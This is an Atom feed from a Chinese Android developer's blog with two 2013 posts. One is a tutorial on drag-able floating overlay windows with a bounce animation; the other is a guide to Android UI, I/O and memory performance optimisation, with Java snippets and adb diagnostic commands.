<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[盖世小虫]]></title>
  <subtitle><![CDATA[清静心性现，水清月影明]]></subtitle>
  <link href="http://suetming.com/atom.xml" rel="self"/>
  <link href="http://suetming.com"/>
  <updated>2013-08-11T10:54:22.162Z</updated>
  <id>http://suetming.com/</id>
  <author>
    <name><![CDATA[SuetMing]]></name>
    <email><![CDATA[suetming.ma@gmail.com]]></email>
  </author>
  <generator uri="http://zespia.tw/hexo">Hexo</generator>
  <entry>
    <title type="html"><![CDATA[仿360|ChatHead等APP悬浮窗和动画效果]]></title>
    <link href="http://suetming.com/2013/08/11/仿360chathead等app悬浮窗效果/"/>
    <id>http://suetming.com/2013/08/11/仿360chathead等app悬浮窗效果/</id>
    <published>2013-08-11T10:54:14.000Z</published>
    <updated>2013-08-11T10:54:14.000Z</updated>
    <content type="html"><![CDATA[<p>360手机卫士很早就有悬浮窗效果，并且搞了各种游戏吸引用户眼球，Facebook出了新版的Facebook Messager，也增加了悬浮窗的效果，大家都在争夺用户的手机桌面，尽可能的强化用户行为习惯。本文不对产品做过多描述，主要讲解如何实现悬浮窗以及相关动画效果</p>
<p><img src="/images/photos/2013-08-11-xiaomi-360safe.png" alt=""></p>
<p><a name="more"></a>
<img src="/images/photos/2013-08-11-xiaomi-360safe2.png" alt=""></p>
<p>如果看看这些有悬浮窗的程序是不用的透明的activity，输入如下命令查看：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre><span class="title">adb</span> shell dumpsys activity services
</pre></td></tr></table></figure>

<p>会发现这几个程序用的都是service而没有activity</p>
<h2>实现原理</h2>
<p>很简单，向Window中添加View即可。总所周知，activity是window实例，Dialog也有自己专用的window，即使是service也有自己的window，比如<a href="http://developer.android.com/reference/android/inputmethodservice/InputMethodService.html">InputMethodService</a>通过window收到touch event根据状态在所有窗口之上画一个输入法的窗体。</p>
<h2>显示悬浮窗</h2>
<p>首先需要获得新建window的权限，官方解释如下：</p>
<blockquote>
<p>Allows an application to open windows using the type TYPE_SYSTEM_ALERT, shown on top of all other applications. Very few applications should use this permission; these windows are intended for system-level interaction with the user.</p>
</blockquote>
<figure class="highlight"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre><span class="tag">&lt;<span class="title">uses-permission</span> <span class="attribute">android:name</span>=<span class="value">"android.permission.SYSTEM_ALERT_WINDOW"</span>/&gt;</span>
</pre></td></tr></table></figure>

<p>然后调用WindowManager的方法addView()添加View和相应的布局：</p>
<figure class="highlight lang-java"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
</pre></td><td class="code"><pre><span class="javadoc">/**
 * Created by SuetMing on 13-7-25.
 */</span>
<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScreenServer</span> <span class="keyword">extends</span> <span class="title">Service</span> {</span>
    WindowManager.LayoutParams params;
    <span class="keyword">private</span> WindowManager windowManager;
    <span class="keyword">private</span> ImageView safe360;
    <span class="keyword">private</span> Point szWindow = <span class="keyword">new</span> Point();
    <span class="keyword">private</span> GestureDetector gestureDetector;
    <span class="annotation">@Override</span>
    <span class="keyword">public</span> IBinder onBind(Intent intent) {
        <span class="comment">// Not used</span>
        <span class="keyword">return</span> <span class="keyword">null</span>;
    }

    <span class="annotation">@Override</span>
    <span class="keyword">public</span> <span class="keyword">void</span> onCreate() {
        <span class="keyword">super</span>.onCreate();

        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);

        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.HONEYCOMB) {
            windowManager.getDefaultDisplay().getSize(szWindow);
        } <span class="keyword">else</span> {
            <span class="keyword">int</span> w = windowManager.getDefaultDisplay().getWidth();
            <span class="keyword">int</span> h = windowManager.getDefaultDisplay().getHeight();
            szWindow.set(w, h);
        }

        gestureDetector = <span class="keyword">new</span> GestureDetector(<span class="keyword">this</span>,<span class="keyword">new</span> GestureListener());

        safe360 = <span class="keyword">new</span> ImageView(<span class="keyword">this</span>);
        safe360.setImageResource(R.drawable.ic_launcher);

        params = <span class="keyword">new</span> WindowManager.LayoutParams(
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                WindowManager.LayoutParams.TYPE_PHONE,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                PixelFormat.TRANSLUCENT);

        params.gravity = Gravity.TOP | Gravity.LEFT;
        params.x = <span class="number">0</span>;
        params.y = <span class="number">100</span>;

        windowManager.addView(safe360, params);

    }

    <span class="annotation">@Override</span>
    <span class="keyword">public</span> <span class="keyword">void</span> onDestroy() {
        <span class="keyword">super</span>.onDestroy();
        <span class="keyword">if</span> (safe360 != <span class="keyword">null</span>) windowManager.removeView(safe360);
    }
}
</pre></td></tr></table></figure>

<p>然后启动service：</p>
<figure class="highlight lang-java"><table><tr><td class="gutter"><pre>1
</pre></td><td class="code"><pre>startService(<span class="keyword">new</span> Intent(context, ChatHeadService.class));
</pre></td></tr></table></figure>

<p>实现效果如下：
<img src="/images/photos/2013-08-11-xiaomi-360safe3.png" alt=""></p>
<h2>拖拽悬浮窗</h2>
<p>现在悬浮窗不能拖动，看看其他悬浮窗都有很多动画效果，如当你移动悬浮窗到中间是会快速的返回贴近窗口，有些还有会弹力球之类动画效果。首先实现基本拖拽效果代码如下：</p>
<figure class="highlight lang-java"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="code"><pre>safe360.setOnTouchListener(<span class="keyword">new</span> View.OnTouchListener() {
  <span class="keyword">private</span> <span class="keyword">int</span> initialX;
  <span class="keyword">private</span> <span class="keyword">int</span> initialY;
  <span class="keyword">private</span> <span class="keyword">float</span> initialTouchX;
  <span class="keyword">private</span> <span class="keyword">float</span> initialTouchY;

  <span class="annotation">@Override</span> <span class="keyword">public</span> <span class="keyword">boolean</span> onTouch(View v, MotionEvent event) {
    <span class="keyword">switch</span> (event.getAction()) {
      <span class="keyword">case</span> MotionEvent.ACTION_DOWN:
        initialX = params.x;
        initialY = params.y;
        initialTouchX = event.getRawX();
        initialTouchY = event.getRawY();
        <span class="keyword">return</span> <span class="keyword">true</span>;
      <span class="keyword">case</span> MotionEvent.ACTION_UP:
        <span class="keyword">return</span> <span class="keyword">true</span>;
      <span class="keyword">case</span> MotionEvent.ACTION_MOVE:
        params.x = initialX + (<span class="keyword">int</span>) (event.getRawX() - initialTouchX);
        params.y = initialY + (<span class="keyword">int</span>) (event.getRawY() - initialTouchY);
        windowManager.updateViewLayout(chatHead, params);
        <span class="keyword">return</span> <span class="keyword">true</span>;
    }
    <span class="keyword">return</span> <span class="keyword">false</span>;
  }
});
</pre></td></tr></table></figure>

<p>增加上述代码后，重新运行看看是不是可以拖拽了O(∩_∩)O~</p>
<h2>弹力球动画效果</h2>
<p>弹力球效果的物理模型在大学物理弹力系统章节里有相应描述，具体可以函数参照这两篇文章：
- <a href="http://khanlou.com/2012/01/dampers-and-their-role-in-physical-models/">mass-spring-damper system</a>
- <a href="http://khanlou.com/2012/01/cakeyframeanimation-make-it-bounce/">bounce animation</a></p>
<p>弹力效果函数如下：</p>
<p><img src="/images/photos/2013-08-11-bounce-equation.png" alt=""></p>
<p>弹力行为反映到图上如下：</p>
<p><img src="/images/photos/2013-08-11-bounce-pic.png" alt=""></p>
<p>实现代码如下:</p>
<figure class="highlight lang-java"><table><tr><td class="gutter"><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
</pre></td><td class="code"><pre>safe360.setOnTouchListener(<span class="keyword">new</span> View.OnTouchListener() {
    <span class="keyword">private</span> <span class="keyword">int</span> initialX;
    <span class="keyword">private</span> <span class="keyword">int</span> initialY;
    <span class="keyword">private</span> <span class="keyword">float</span> initialTouchX;
    <span class="keyword">private</span> <span class="keyword">float</span> initialTouchY;

    <span class="annotation">@Override</span>
    <span class="keyword">public</span> <span class="keyword">boolean</span> onTouch(View v, MotionEvent event) {
        gestureDetector.onTouchEvent(event);
        <span class="keyword">switch</span> (event.getAction()) {
            <span class="keyword">case</span> MotionEvent.ACTION_DOWN:
                initialX = params.x;
                initialY = params.y;
                initialTouchX = event.getRawX();
                initialTouchY = event.getRawY();
                <span class="keyword">return</span> <span class="keyword">true</span>;
            <span class="keyword">case</span> MotionEvent.ACTION_UP:
                resetPosition();
                <span class="keyword">return</span> <span class="keyword">true</span>;
            <span class="keyword">case</span> MotionEvent.ACTION_MOVE:
                params.x = initialX + (<span class="keyword">int</span>) (event.getRawX() - initialTouchX);
                params.y = initialY + (<span class="keyword">int</span>) (event.getRawY() - initialTouchY);
                windowManager.updateViewLayout(safe360, params);
                <span class="keyword">return</span> <span class="keyword">true</span>;
        }
        <span class="keyword">return</span> <span class="keyword">false</span>;
    }
});

<span class="keyword">private</span> <span class="keyword">void</span> resetPosition() {
    <span class="keyword">int</span> w = safe360.getWidth();

    <span class="keyword">if</span>(params.x == <span class="number">0</span> || params.x == szWindow.x - w){

    } <span class="keyword">else</span> <span class="keyword">if</span>(params.x + w / <span class="number">2</span>&lt;= szWindow.x / <span class="number">2</span>){
        moveToLeft();
    } <span class="keyword">else</span> <span class="keyword">if</span>(params.x + w / <span class="number">2</span> &gt; szWindow.x / <span class="number">2</span>){
        moveToRight();
    }
}

<span class="keyword">private</span> <span class="keyword">void</span> moveToLeft(){
    <span class="keyword">final</span> <span class="keyword">int</span> x = params.x;
    <span class="keyword">new</span> CountDownTimer(<span class="number">500</span>, <span class="number">5</span>) {
        <span class="keyword">public</span> <span class="keyword">void</span> onTick(<span class="keyword">long</span> t) {
            <span class="keyword">long</span> step = (<span class="number">500</span> - t)/<span class="number">5</span>;
            params.x = (<span class="keyword">int</span>)(<span class="keyword">double</span>)Math.bounceValue(step,x);
            windowManager.updateViewLayout(safe360, params);
        }
        <span class="keyword">public</span> <span class="keyword">void</span> onFinish() {
            params.x = <span class="number">0</span>;
            windowManager.updateViewLayout(safe360, params);
        }
    }.start();
}

<span class="keyword">private</span>  <span class="keyword">void</span> moveToRight(){
    <span class="keyword">final</span> <span class="keyword">int</span> x = params.x;
    <span class="keyword">new</span> CountDownTimer(<span class="number">500</span>, <span class="number">5</span>) {
        <span class="keyword">public</span> <span class="keyword">void</span> onTick(<span class="keyword">long</span> t) {
            <span class="keyword">long</span> step = (<span class="number">500</span> - t)/<span class="number">5</span>;
            params.x = szWindow.x + (<span class="keyword">int</span>)(<span class="keyword">double</span>)Math.bounceValue(step,x) - safe360.getWidth();
            windowManager.updateViewLayout(safe360, params);
        }
        <span class="keyword">public</span> <span class="keyword">void</span> onFinish() {
            params.x = szWindow.x - safe360.getWidth();
            windowManager.updateViewLayout(safe360, params);
        }
    }.start();
}
</pre></td></tr></table></figure>

<p>android录像比较麻烦（后面考虑开发一个android的录像程序，好像目前还没有同类app呢）这里有一个ios上仿Chathead的视窗实现效果如下：</p>
<p><a href="https://dl.dropboxusercontent.com/u/2187517/Uploads/ChatHeads/move.m4v">Chathead on IOS</a></p>
<ul>
<li>DEMO源码见<a href="https://github.com/suetming/floatingwindow.git">这里</a>(IDE环境：android studio)</li>
<li>APK程序见<a href="http://pan.baidu.com/share/link?shareid=691406723&amp;uk=2701585459">这里</a></li>
</ul>
]]></content>
    <category scheme="http://suetming.com/tags/悬浮窗/" term="悬浮窗"/>
    <category scheme="http://suetming.com/categories/android/" term="android"/>
  </entry>
  <entry>
    <title type="html"><![CDATA[android深度优化]]></title>
    <link href="http://suetming.com/2013/08/11/2013-07-13-android-performance/"/>
    <id>http://suetming.com/2013/08/11/2013-07-13-android-performance/</id>
    <published>2013-08-11T10:54:10.000Z</published>
    <updated>2013-08-11T10:54:10.000Z</updated>
    <content type="html"><![CDATA[<p>android开发有几年了，对其相关有些许认识，虽然现在手机的硬件配置以极快的速度提升，但是优化仍然占有重要的位置，是必不可少的重要环节，本文主要是写自己在学习和实际开发app过程中的吸取的教训和对优化相关认识的总结，如有不周之处，还请批评指正</p>
<p><a name="more"></a>
本文主要由以下几部分组成：</p>
<ul>
<li>framework API</li>
<li>UI 性能优化</li>
<li>I/O 性能优化</li>
<li>速度优化【泛指】</li>
</ul>
<h2>Framework API</h2>
<h2>1.繁重的任务请开启新线程，UI线程只做UI的任务</h2>
<ul>
<li>Thread、Runnable、Future、ExecutorService、AsyncTask</li>
</ul>
<pre><code class="lang-java"><figure class="highlight lang-java"><pre><span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() {
    <span class="annotation">@Override</span>
    <span class="keyword">public</span> <span class="keyword">void</span> run() {
        <span class="comment">// 后台任务</span>
    }
}).start();
</pre></figure></code></pre>
<pre><code class="lang-java"><figure class="highlight lang-java"><pre><span class="keyword">new</span> AsyncTask&lt;URL, Integer, Integer&gt;() {
    <span class="keyword">protected</span> Long doInBackground(URL... urls) {
        <span class="comment">// background thread</span>
        <span class="comment">// fetch url/save open file/...</span>
    }

    <span class="keyword">protected</span> <span class="keyword">void</span> onProgressUpdate(Integer... progress) {
        updateProgress(progress[<span class="number">0</span>]);
    }

    <span class="keyword">protected</span> <span class="keyword">void</span> onPostExecute(Integer result) {
        <span class="comment">// frontend thread</span>
    }
}
</pre></figure></code></pre>
<pre><code class="lang-java"><figure class="highlight lang-java"><pre>HandlerThread mHandlerThread = <span class="keyword">new</span> HandlerThread(<span class="string">"WorkerThread"</span>);
    Handler handler = <span class="keyword">new</span> Handler(mHandlerThread.getLooper()) {
        <span class="annotation">@Override</span>
        <span class="keyword">public</span> <span class="keyword">void</span> handleMessage(Message msg) {
            <span class="keyword">switch</span> (msg.what) {
            <span class="keyword">case</span> JOB_1:
            <span class="comment">// do job #1</span>
            <span class="keyword">break</span>;
            <span class="keyword">case</span> JOB_2:
            <span class="comment">// do job #2</span>
            <span class="keyword">break</span>;
        }
    }
};

handler.sendEmptyMessage(JOB_1);
handler.sendEmptyMessage(JOB_2);
handler.post(<span class="keyword">new</span> Runnable() {
    <span class="annotation">@Override</span>
    <span class="keyword">public</span> <span class="keyword">void</span> run() {
        <span class="comment">// do more work</span>
    }
});

<span class="annotation">@Override</span>
<span class="keyword">protected</span> <span class="keyword">void</span> onDestroy() {
    mHandlerThread.quit();
    <span class="keyword">super</span>.onDestroy();
}
</pre></figure></code></pre>
<p>由于thread比较简单，不支持并发中的很多特性，如果要求同步和调度等功能需要自己实现，可选用Asynctask来处理，不过如果需要和frontend有更多的交互，则thread+handler+looper更灵活</p>
<p>如果要处理ContentProvider相关内容，这些耗时操作可以用AsyncQueryHandler来处理</p>
<pre><code class="lang-java"><figure class="highlight lang-java"><pre><span class="keyword">new</span> AsyncQueryHandler(getContentResolver()) {
    <span class="annotation">@Override</span>
    <span class="keyword">protected</span> <span class="keyword">void</span> onQueryComplete(<span class="keyword">int</span> token, Object cookie,Cursor cursor) {
        <span class="keyword">if</span> (token == <span class="number">0</span>) {
            <span class="comment">// get data from cursor</span>
        }
    }
}.startQuery(<span class="number">0</span>, <span class="comment">// token</span>
            <span class="keyword">null</span>, <span class="comment">// cookie</span>
            RawContacts.CONTENT_URI, <span class="keyword">null</span>, <span class="comment">// projection</span>
            RawContacts.CONTACT_ID + <span class="string">"&lt;?"</span>, <span class="comment">// selection</span>
            <span class="keyword">new</span> String[] { <span class="string">"888"</span> }, <span class="comment">// selectionArgs</span>
            RawContacts.DISPLAY_NAME_PRIMARY + <span class="string">" ASC"</span>);  <span class="comment">// orderby</span>
</pre></figure></code></pre>
<p>如果后台运行服务需要做耗时操作请采用IntentService而不是Service，因为Service和应用程序在同一个进程不是单独的进程; Service也不是线程，所以需要避免做耗时操作</p>
<pre><code class="lang-java"><figure class="highlight lang-java"><pre><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WorkerService</span> <span class="keyword">extends</span> <span class="title">IntentService</span> {</span>
    <span class="keyword">public</span> WorkerService() {
        <span class="keyword">super</span>(<span class="string">"WorkerThread"</span>);
    }

    <span class="annotation">@Override</span>
    <span class="keyword">protected</span> <span class="keyword">void</span> onHandleIntent(Intent intent) {
        String action = intent.getAction();
        <span class="keyword">if</span> (<span class="string">"com.test.DO_JOB_1"</span>.equals(action)) {
            <span class="comment">// 耗时操作</span>
        }
    }
}

startService(<span class="keyword">new</span> Intent(<span class="string">"com.test.DO_JOB_1"</span>));
</pre></figure></code></pre>
<p>总结，采用下述API避免在UI线程做耗时操作</p>
<ul>
<li>Activity or Fragment<ul>
<li>Handler, HandlerThread</li>
<li>AsyncTask</li>
<li>AsyncTaskLoader</li>
</ul>
</li>
<li>ContentProvider<ul>
<li>AsyncQueryHandler</li>
<li>CursorLoader</li>
</ul>
</li>
<li>Service<ul>
<li>IntentService</li>
<li>Parcel.writeStrongBinder(IBinder)</li>
</ul>
</li>
</ul>
<p>另外，部分Java方法请采用google建议的代码库代替，如： 
- gson、fastjson 替换 JSONObject
- volley 替换 HttpURLConnection、HttpClient</p>
<h2>UI性能优化</h2>
<p>UI性能优化需要清楚UI的层次结构和几个API：Measure、Layout、Draw，还有事件处理流程key events、TrackBall events、Touch events</p>
<p>相关概况如下：</p>
<ul>
<li>1.尽量简化视图布局，用 Hierarchy Viewer来查看瓶颈所在，用 layoutopt来查找布局文件中的常见问题</li>
<li>2.采用RelativeLayout或者GridLayout来替换多个LinearLayout</li>
<li>3.不经常用的视图可以采用<Viewstub/>延迟加载</li>
<li>4.标签<merge/>重用布局文件</li>
<li>5.尽量使用点9作为背景</li>
</ul>
<p>Scrolling和ListView是讨论的比较多的，这里单独拿出来强调一下</p>
<ul>
<li>缓存Item避免重复Inflate：</li>
</ul>
<pre><code class="lang-java"><figure class="highlight lang-java"><pre><span class="annotation">@Override</span>
<span class="keyword">public</span> View getView(<span class="keyword">int</span> position, View convertView, ViewGroup parent) {
    <span class="keyword">if</span> (convertView == <span class="keyword">null</span>) {
        convertView = mInflater.inflate(R.layout.main, parent, <span class="keyword">false</span>);
        ViewHolder holder = <span class="keyword">new</span> ViewHolder();
        holder.img = (ImageView) convertView.findViewById(R.id.image);
        holder.txt = (TextView) convertView.findViewById(R.id.text);
        convertView.setTag(holder);
    }
    ViewHolder holder = (ViewHolder) convertView.getTag();
    holder.img.setImageResource(R.drawable.icon);
    holder.txt.setText(R.string.hello);
    <span class="keyword">return</span> convertView;
}

<span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ViewHolder</span> {</span>
    ImageView img;
    TextView txt;
}
</pre></figure></code></pre>
<ul>
<li>尽量缓存view避免findviewById()</li>
<li>避免不必要的drawing</li>
</ul>
<p>通常情况下即使一个实体的子类view在最前面，android也会绘制每一个父类view，所以如果有不可见的父类视图则需要禁用draw来减少消耗</p>
<p>其次大多数情况下Window的背景也不需要绘制</p>
<pre><code><figure class="highlight"><pre>getWindow()<span class="preprocessor">.setBackgroundDrawable</span>(null)<span class="comment">;</span>

<span class="label">android:</span>windowBackground=<span class="string">"@null"</span> // XML
</pre></figure></code></pre>
<ul>
<li>运行时要避免图像放缩等耗时操作</li>
<li>滚动时避免animations(AnimationDrawable...)</li>
<li>如果要用animations，设置ListView.setDrawableCacheEnabled(false)</li>
</ul>
<h2>I/O 性能优化</h2>
<ul>
<li>SharedPreferences是耗时I/O操作请采用异步方式</li>
</ul>
<pre><code class="lang-java"><figure class="highlight lang-java"><pre>SharedPreferences.Editor.apply();  <span class="comment">// asynchronous</span>
SharedPreferences.Editor.commit(); <span class="comment">// synchronous</span>
</pre></figure></code></pre>
<p>可以采用下面的封装</p>
<pre><code class="lang-java"><figure class="highlight lang-java"><pre><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SharedPreferencesUtils</span> {</span>
    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Method sApplyMethod = findApplyMethod();
    <span class="keyword">private</span> <span class="keyword">static</span> Method findApplyMethod() {
        <span class="keyword">try</span> {
            Class cls = SharedPreferences.Editor.class;
            <span class="keyword">return</span> cls.getMethod(<span class="string">"apply"</span>);
        } <span class="keyword">catch</span> ( NoSuchMethodException unused ) {
            <span class="comment">// fall through</span>
        }
        <span class="keyword">return</span> <span class="keyword">null</span>;
    }
    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> apply(SharedPreferences.Editor editor) {
        <span class="keyword">if</span> ( sApplyMethod != <span class="keyword">null</span> ) {
            <span class="keyword">try</span> {
                sApplyMethod.invoke(editor);
                <span class="keyword">return</span>;
            } <span class="keyword">catch</span> ( InvocationTargetException unused ) {
                <span class="comment">// fall through</span>
            } <span class="keyword">catch</span> ( IllegalAccessException unused ) {
                <span class="comment">// fall through</span>
            }
        }
        editor.commit();
    }
}
</pre></figure></code></pre>
<ul>
<li>数据库查询可以采用<a href="http://www.sqlite.org/eqp.html">EXPLAIN QUERY PLAN</a>来确定哪些信息需要优化或者用TraceView查看</li>
<li>SQLITE的某些字段可以添加索引提高查询速度</li>
</ul>
<p><img src="/images/photos/2013-07-sqlite-db-index.png" alt="sqlite添加索引"></p>
<ul>
<li><p>如无必要请对查询的数据增加限制LIMIT来减少耗时</p>
</li>
<li><p>可以用<a href="http://developer.android.com/reference/android/database/sqlite/SQLiteStatement.html">SQLiteStatement</a>来预编译一些频繁使用的sql语句</p>
</li>
</ul>
<pre><code class="lang-java"><figure class="highlight lang-java"><pre>SQLiteDatabase db = dbHelper.getWritableDatabase();
SQLiteStatement stmt = db.compileStatement(<span class="string">"SELECT * FROM Country WHERE code = ?"</span>);
stmt.bindString(<span class="number">1</span>, <span class="string">"US"</span>);
stmt.execute();
</pre></figure></code></pre>
<ul>
<li>如果用了ContentObserver，请延迟查询操作</li>
</ul>
<pre><code class="lang-java"><figure class="highlight lang-java"><pre>getContentResolver().registerContentObserver(uri, <span class="keyword">true</span>,
    <span class="keyword">new</span> ContentObserver(<span class="keyword">new</span> Handler()) {
            <span class="annotation">@Override</span>
            <span class="keyword">public</span> <span class="keyword">void</span> onChange(<span class="keyword">boolean</span> selfChange) {
                mDirty = <span class="keyword">true</span>;
            }
    })
);

<span class="annotation">@Override</span>
<span class="keyword">protected</span> <span class="keyword">void</span> onResume() {
    <span class="keyword">super</span>.onResume();
    <span class="keyword">if</span> (mDirty) {
        <span class="comment">// start query again</span>
        mDirty = <span class="keyword">false</span>;
    }
})
</pre></figure></code></pre>
<ul>
<li>能批量操作的尽量批量操作ContentProviderOperation、ContentProviderOperation.Builder、ContentResolver.applyBatch()</li>
<li>多线程情况下可以采用SQLITEDatabase.yieldIfContendedSafely()</li>
</ul>
<pre><code class="lang-java"><figure class="highlight lang-java"><pre><span class="annotation">@Override</span>
<span class="keyword">public</span> <span class="keyword">int</span> bulkInsert(Uri uri, ContentValues[] values) {
    <span class="keyword">int</span> numValues = values.length;
    mDb = mOpenHelper.getWritableDatabase();
    mDb.beginTransactionWithListener(<span class="keyword">this</span>);
    <span class="keyword">try</span> {
        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numValues; i++) {
            Uri result = insertInTransaction(uri, values[i]);
            <span class="keyword">if</span> (result != <span class="keyword">null</span>) {
                mNotifyChange = <span class="keyword">true</span>;
            }
            mDb.yieldIfContendedSafely();
        }
        mDb.setTransactionSuccessful();
    } <span class="keyword">finally</span> {
        mDb.endTransaction();
    }

    onEndTransaction();
    <span class="keyword">return</span> numValues;
}
</pre></figure></code></pre>
<ul>
<li>输出事件日志分析耗时操作并优化</li>
</ul>
<pre><code><figure class="highlight"><pre><span class="tag">adb</span> <span class="tag">logcat</span> -<span class="tag">b</span> <span class="tag">events</span> <span class="tag">content_query_sample</span><span class="pseudo">:I</span> *<span class="pseudo">:S</span>
</pre></figure></code></pre>
<p>内存性能优化
内存这块比较大，从底层的Linux的就有OOM killer到Android系统层的OOM killer，我们只讨论应用层</p>
<p>在应用层上，android严格控制每一个应用程序分配多少内存，当应用超出这个限制会抛出OutOfMemoryError</p>
<p>打开ADT的heap可以查看里面每一列</p>
<p><img src="/images/photos/2013-07-heap.png" alt="heap"></p>
<p>这里要说明几个概念：
- Heap limit：Dalvik heap最大值
- Heap size: Dalvik heap当前值
- Allocated： Dalvik heap分配的字节数
- Free：还能分配的Heap size
- %Used: free / heap size * 100%
- External allocation: Bitmap内存(HoneyComb版本之前的参数)</p>
<p>其次不同机型的Heap size limit是不同的，通过ActivityManager.getMemoryClass()获取内存信息</p>
<p>出现OOM的条件：
- Honeycomb之前</p>
<pre><code><figure class="highlight"><pre><span class="comment">Heap</span> <span class="comment">size</span> <span class="literal">+</span> <span class="comment">external</span> <span class="comment">allocation</span> <span class="literal">+</span> <span class="comment">new</span> <span class="comment">allocation</span> <span class="comment">request</span> &gt;<span class="comment">=</span> <span class="comment">Heap</span> <span class="comment">limit
</pre></figure></code></pre>
<ul>
<li>Honeycomb之后</li>
</ul>
<pre><code><figure class="highlight"><pre><span class="title">Heap</span> size + new allocation request &gt;= Heap limit
<span class="number">104</span>
</pre></figure></code></pre>
<p>不过上述情况并不能代表应用进程的实际使用情况，要注意以下几点
- 每一个进程初始情况下有2MB+的开销
- 本地下可以分配更多的内存：android app 运行在Dalvik VM上，但是通过JNI可以调用本地lib，并且可以在lib中做相关操作
- 如果开启硬件加速（ICS默认开启），会给OpenGL分配8MB初始内存</p>
<p>通过下述命令查看内存使用情况</p>
<pre><code><figure class="highlight"><pre><span class="title">adb</span> shell procrank -p
</pre></figure></code></pre>
<p><img src="/images/photos/2013-07-memory-usage.png" alt="memory useage"></p>
<p>图解说明：
- VSS(Virtual Set Size)：进程可以得到的总页数
- RSS(Resident Set Size)：进程可以在RAM中获得的总页数
- PSS(Proportional Set Size)：进程可以在RAM中已经用的总页数
- USS(Unique Set Size))：进程可以取得的未分配的页数</p>
<p>打印进程虚拟内存相关命令如下：</p>
<pre><code><figure class="highlight"><pre>adb shell procmem -p <span class="tag">&lt;<span class="title">pid</span>&gt;</span>
adb shell dumpsys meminfo <span class="tag">&lt;<span class="title">pid</span>&gt;</span>
</pre></figure></code></pre>
<p>stackoverflow：<a href="http://stackoverflow.com/questions/2298208/how-to-discover-memory-usage-of-my-application-in-android">http://stackoverflow.com/questions/2298208/how-to-discover-memory-usage-of-my-application-in-android</a></p>
<p>如何避免内存泄露？</p>
<p>想要避免内存泄露，那么就需要了解垃圾回收(GC)</p>
<ul>
<li><p>Gingerbread之前：</p>
<ul>
<li>Stop the world</li>
<li>Full Heap collection</li>
<li>Pause times often &gt; 100ms</li>
</ul>
</li>
<li><p>Gingerbread之后：</p>
<ul>
<li>Concurrent（大部分情况下）</li>
<li>Partial collection</li>
<li>Pause times usually &lt; 5ms</li>
</ul>
</li>
</ul>
<p>内存泄露主要是有代码本身造成的，GC无法阻止人为的内存泄露问题；只要有生命周期长度的引用引用了没用的对象，GC就无法回收；那么最有可能出现这种内存泄露的是那些对象呢？你猜对了，是Context/Activity</p>
<p>参考：<a href="http://dubroy.com/blog/google-io-memory-management-for-android-apps/附图如下：">http://dubroy.com/blog/google-io-memory-management-for-android-apps/附图如下：</a>
<img src="/images/photos/2013-07-memory-leak.png" alt="memory leak"></p>
<pre><code class="lang-java"><figure class="highlight lang-java"><pre><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> <span class="keyword">extends</span> <span class="title">Activity</span> <span class="keyword">implements</span> <span class="title">ActionBar</span>.<span class="title">TabListener</span> {</span>
    <span class="keyword">static</span> Leaky leak = <span class="keyword">null</span>;
    <span class="class"><span class="keyword">class</span> <span class="title">Leaky</span> {</span>
        <span class="keyword">void</span> doSomething(){
            System.out.print(<span class="string">"Wheee!!!"</span>);
        }
    }

    <span class="annotation">@Override</span>
    <span class="keyword">public</span> <span class="keyword">void</span> onCreate(Bundle savedInstanceState){
        <span class="keyword">if</span> (leak==<span class="keyword">null</span>){
            leak = <span class="keyword">new</span> Leaky();
        }
    }
}
</pre></figure></code></pre>
<p>上述代码引用了一个私有非静态内部类的实例对象，情况可想而知：</p>
<p><img src="/images/photos/2013-07-inner-class-object.png" alt="inner class"></p>
<p>一个超过Activity生命周期的线程，会发生什么情况？内存泄露</p>
<pre><code class="lang-java"><figure class="highlight lang-java"><pre><span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() {
    <span class="annotation">@Override</span>
    <span class="keyword">public</span> <span class="keyword">void</span> run() {
        <span class="comment">// do some heavy work</span>
    }
}).start();
</pre></figure></code></pre>
<p>如何检测内存泄露?</p>
<p>1.LOGCAT</p>
<p><img src="/images/photos/2013-07-logcat.png" alt="logcat"></p>
<p>上述每一个字段都有明确的意义，具体概念不详述了请google</p>
<p>2.Allocation Tracker可以查看已经分配内存去没有用到的对象</p>
<p><img src="/images/photos/2013-07-reference-object.png" alt="look up object"></p>
<p>3.Eclipse Memory Analyzer (MAT)可以查看潜在的内存泄露</p>
<p>DEMO：
- <a href="http://dubroy.com/blog/google-io-memory-management-for-android-apps/">dubroy</a>
- <a href="http://www.youtube.com/watch?feature=player_embedded&amp;v=_CruQY55HOk">youtube</a></p>
<p>4.Histogram：查看Activity的实例数量，一个activity不止一个实例在运行是潜在内存泄露信号</p>
<p><img src="/images/photos/2013-07-histogram.png" alt="histogram"></p>
